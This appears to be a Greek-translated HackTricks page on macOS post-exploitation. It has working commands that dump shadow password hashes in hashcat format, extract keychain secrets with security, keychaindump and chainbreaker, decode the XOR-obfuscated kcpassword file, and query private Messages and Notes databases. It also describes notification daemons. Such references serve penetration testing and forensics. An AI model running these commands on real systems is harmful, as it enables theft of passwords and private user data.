# macOS Ευαίσθητες Τοποθεσίες & Ενδιαφέροντες Δαίμονες

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Κωδικοί Πρόσβασης

### Σκιώδεις Κωδικοί Πρόσβασης

Ο σκιώδης κωδικός πρόσβασης αποθηκεύεται μαζί με τη διαμόρφωση του χρήστη σε plists που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το παρακάτω oneliner μπορεί να χρησιμοποιηθεί για να ανακτήσει **όλες τις πληροφορίες σχετικά με τους χρήστες** (συμπεριλαμβανομένων των πληροφοριών για το hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Σενάρια όπως αυτό εδώ**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για να μετατρέψουν το hash σε μορφή **hashcat**.

Ένα εναλλακτικό one-liner το οποίο θα αδειάσει τα διαπιστευτήρια όλων των λογαριασμών μη-υπηρεσιών σε μορφή hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain Dump

Σημειώστε ότι κατά τη χρήση του δυαδικού security για **αποθήκευση των κωδικών αποκρυπτογραφημένων**, πολλές προτροπές θα ζητήσουν από τον χρήστη να επιτρέψει αυτήν τη λειτουργία.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Βασισμένο σε αυτό το σχόλιο [juuso/keychaindump#10 (σχόλιο)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) φαίνεται ότι αυτά τα εργαλεία δεν λειτουργούν πλέον στο Big Sur.
{% endhint %}

### Επισκόπηση Keychaindump

Ένα εργαλείο με το όνομα **keychaindump** έχει αναπτυχθεί για την εξαγωγή κωδικών από τα keychains του macOS, αλλά αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις macOS όπως το Big Sur, όπως υποδεικνύεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί από τον επιτιθέμενο να κερδίσει πρόσβαση και να αναβαθμίσει τα προνόμια σε **root**. Το εργαλείο εκμεταλλεύεται το γεγονός ότι το keychain είναι ξεκλείδωτο από προεπιλογή κατά τη σύνδεση του χρήστη για την ευκολία, επιτρέποντας σε εφαρμογές να τον προσπεράσουν χωρίς την ανάγκη επαναλαμβανόμενου κωδικού πρόσβασης από τον χρήστη. Ωστόσο, αν ένας χρήστης επιλέξει να κλειδώσει το keychain μετά από κάθε χρήση, το **keychaindump** γίνεται αναποτελεσματικό.

Το **Keychaindump** λειτουργεί στοχεύοντας ένα συγκεκριμένο διεργασία με το όνομα **securityd**, περιγράφεται από την Apple ως ένας δαίμονας για την εξουσιοδότηση και κρυπτογραφικές λειτουργίες, ουσιώδης για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει την εντοπισμό ενός **Master Key** που προέρχεται από τον κωδικό σύνδεσης του χρήστη. Αυτό το κλειδί είναι ουσιώδες για την ανάγνωση του αρχείου keychain. Για να εντοπίσει το **Master Key**, το **keychaindump** σαρώνει τη μνήμη του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά κλειδιά μέσα σε περιοχές που σημειώνονται ως `MALLOC_TINY`. Η παρακάτω εντολή χρησιμοποιείται για τον έλεγχο αυτών των τοποθεσιών μνήμης:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Αφού εντοπιστούν πιθανοί κύριοι κλειδιά, το **keychaindump** αναζητά μέσω των σωρών ένα συγκεκριμένο πρότυπο (`0x0000000000000018`) που υποδηλώνει ένα υποψήφιο για το κύριο κλειδί. Περαιτέρω βήματα, συμπεριλαμβανομένης της απο-εμφάνισης, απαιτούνται για να χρησιμοποιηθεί αυτό το κλειδί, όπως περιγράφεται στον πηγαίο κώδικα του **keychaindump**. Οι αναλυτές που επικεντρώνονται σε αυτόν τον τομέα πρέπει να σημειώσουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται μέσα στη μνήμη της διεργασίας **securityd**. Ένα παράδειγμα εντολής για την εκτέλεση του **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για την εξαγωγή των ακόλουθων τύπων πληροφοριών από έναν OSX keychain με τρόπο που να είναι ασφαλής από δικαστική άποψη:

* Κρυπτογραφημένος κωδικός keychain, κατάλληλος για αποκρυπτογράφηση με το [hashcat](https://hashcat.net/hashcat/) ή το [John the Ripper](https://www.openwall.com/john/)
* Κωδικοί Internet
* Γενικοί κωδικοί
* Ιδιωτικοί Κλειδιά
* Δημόσια Κλειδιά
* Πιστοποιητικά X509
* Ασφαλείς Σημειώσεις
* Κωδικοί Appleshare

Δεδομένου του κωδικού ξεκλειδώματος του keychain, ενός κύριου κλειδιού που αποκτήθηκε χρησιμοποιώντας το [volafox](https://github.com/n0fate/volafox) ή το [volatility](https://github.com/volatilityfoundation/volatility), ή ενός αρχείου ξεκλειδώματος όπως το SystemKey, το Chainbreaker θα παρέχει επίσης κωδικούς πλήρεις κειμένου.

Χωρίς έναν από αυτούς τους τρόπους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις άλλες διαθέσιμες πληροφορίες.

#### **Αποθήκευση κλειδιών keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Απορρόφηση κλειδιών keychain (με κωδικούς πρόσβασης) με το SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Απορρόφηση κλειδιών keychain (με κωδικούς πρόσβασης) σπάζοντας το hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Απορρόφηση κλειδιψιών keychain (με κωδικούς πρόσβασης) με απορρόφηση μνήμης**

[Ακολουθήστε αυτά τα βήματα](../#dumping-memory-with-osxpmem) για να εκτελέσετε μια **απορρόφηση μνήμης**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Απορρόφηση κλειδιών keychain (με κωδικούς πρόσβασης) χρησιμοποιώντας τον κωδικό του χρήστη**

Εάν γνωρίζετε τον κωδικό του χρήστη, μπορείτε να τον χρησιμοποιήσετε για **απορρόφηση και αποκρυπτογράφηση keychains που ανήκουν στον χρήστη**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Το αρχείο **kcpassword** είναι ένα αρχείο που κρατά το **κωδικό πρόσβασης του χρήστη**, μόνο εάν ο ιδιοκτήτης του συστήματος έχει **ενεργοποιήσει την αυτόματη σύνδεση**. Έτσι, ο χρήστης θα συνδεθεί αυτόματα χωρίς να του ζητηθεί κωδικός πρόσβασης (το οποίο δεν είναι πολύ ασφαλές).

Ο κωδικός πρόσβασης αποθηκεύεται στο αρχείο **`/etc/kcpassword`** που έχει γίνει xor με το κλειδί **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Εάν ο κωδικός πρόσβασης του χρήστη είναι μεγαλύτερος από το κλειδί, το κλειδί θα επαναχρησιμοποιηθεί.\
Αυτό καθιστά τον κωδικό πρόσβασης αρκετά εύκολο να ανακτηθεί, για παράδειγμα χρησιμοποιώντας σενάρια όπως [**αυτό**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ενδιαφέρουσες Πληροφορίες σε Βάσεις Δεδομένων

### Μηνύματα
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Ειδοποιήσεις

Μπορείτε να βρείτε τα δεδομένα Ειδοποιήσεων στο `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Το μεγαλύτερο μέρος των ενδιαφερουσών πληροφοριών θα βρίσκεται στο **blob**. Έτσι θα χρειαστεί να **εξάγετε** αυτό το περιεχόμενο και να το **μετατρέψετε** σε **αναγνώσιμη** μορφή ή να χρησιμοποιήσετε το **`strings`**. Για να το προσπελάσετε μπορείτε να κάνετε:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Σημειώσεις

Οι **σημειώσεις** των χρηστών μπορούν να βρεθούν στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Προτιμήσεις

Στις εφαρμογές macOS, οι προτιμήσεις βρίσκονται στο **`$HOME/Library/Preferences`** και στο iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

Στο macOS, το εργαλείο γραμμής εντολών **`defaults`** μπορεί να χρησιμοποιηθεί για να **τροποποιήσει το αρχείο προτιμήσεων**.

Το **`/usr/sbin/cfprefsd`** διεκδικεί τις υπηρεσίες XPC `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για να εκτελέσει ενέργειες όπως η τροποποίηση προτιμήσεων.

## Ειδοποιήσεις Συστήματος

### Ειδοποιήσεις Darwin

Το κύριο δαίμονα για τις ειδοποιήσεις είναι το **`/usr/sbin/notifyd`**. Για να λάβουν ειδοποιήσεις, οι πελάτες πρέπει να εγγραφούν μέσω της θύρας Mach `com.apple.system.notification_center` (ελέγξτε τους με `sudo lsmp -p <pid notifyd>`). Το δαίμονας είναι παραμετροποιήσιμος με το αρχείο `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις ειδοποιήσεις είναι μοναδικές αντιστροφές σημειώσεις DNS και όταν στέλνεται μια ειδοποίηση σε ένα από αυτά, το(τα) πελάτη(ες) που έχουν δηλώσει ότι μπορούν να τη χειριστούν θα τη λάβουν.

Είναι δυνατό να αδειάσετε την τρέχουσα κατάσταση (και να δείτε όλα τα ονόματα) στέλνοντας το σήμα SIGUSR2 στη διαδικασία notifyd και διαβάζοντας το δημιουργημένο αρχείο: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Κέντρο Κατανομής Ειδοποιήσεων

Το **Κέντρο Κατανομής Ειδοποιήσεων** του οποίου το κύριο δυαδικό είναι το **`/usr/sbin/distnoted`**, είναι ένας άλλος τρόπος για να στέλνετε ειδοποιήσεις. Εκθέτει μερικές υπηρεσίες XPC και πραγματοποιεί μερικούς ελέγχους για να προσπαθήσει να επαληθεύσει τους πελάτες.

### Ειδοποιήσεις Πιέσεως Apple (APN)

Σε αυτήν την περίπτωση, οι εφαρμογές μπορούν να εγγραφούν για **θέματα**. Ο πελάτης θα δημιουργήσει ένα τεκμήριο επικοινωνώντας με τους διακομιστές της Apple μέσω του **`apsd`**.\
Στη συνέχεια, οι παροχείς θα έχουν επίσης δημιουργήσει ένα τεκμήριο και θα μπορούν να συνδεθούν με τους διακομιστές της Apple για να στείλουν μηνύματα στους πελάτες. Αυτά τα μηνύματα θα ληφθούν τοπικά από το **`apsd`** το οποίο θα μεταδώσει την ειδοποίηση στην εφαρμογή που την περιμένει.

Οι προτιμήσεις βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια τοπική βάση δεδομένων μηνυμάτων που βρίσκεται στο macOS στο `/Library/Application\ Support/ApplePushService/aps.db` και στο iOS στο `/var/mobile/Library/ApplePushService`. Έχει 3 πίνακες: `incoming_messages`, `outgoing_messages` και `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Είναι επίσης δυνατό να λάβετε πληροφορίες σχετικά με τον daemon και τις συνδέσεις χρησιμοποιώντας:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Ειδοποιήσεις Χρήστη

Αυτές είναι ειδοποιήσεις που ο χρήστης πρέπει να δει στην οθόνη:

- **`CFUserNotification`**: Αυτή η API παρέχει έναν τρόπο να εμφανιστεί στην οθόνη ένα αναδυόμενο παράθυρο με ένα μήνυμα.
- **Το Bulletin Board**: Αυτό εμφανίζει στο iOS ένα banner που εξαφανίζεται και θα αποθηκευτεί στο Notification Center.
- **`NSUserNotificationCenter`**: Αυτό είναι το bulletin board του iOS στο MacOS. Η βάση δεδομένων με τις ειδοποιήσεις βρίσκεται στο `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
